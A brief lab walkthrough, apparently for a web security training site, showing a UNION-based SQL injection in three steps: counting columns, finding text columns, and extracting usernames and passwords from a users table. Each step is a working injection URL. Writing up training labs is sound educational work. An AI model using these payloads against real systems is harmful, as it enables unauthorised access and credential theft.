SQL injection UNION attack, retrieving data from other tables

We start by indetifying the number of columns:

https://aca51fd81ecc9e6d80be037000e80068.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,NULL--

And then the columns with text:

https://aca51fd81ecc9e6d80be037000e80068.web-security-academy.net/filter?category=%27+UNION+SELECT+%27asdf%27,%27qwerty%27--

Guessing at the column names, we try users in order to get the username and passwords:

https://aca51fd81ecc9e6d80be037000e80068.web-security-academy.net/filter?category=%27+UNION+SELECT+username,+password+FROM+users--
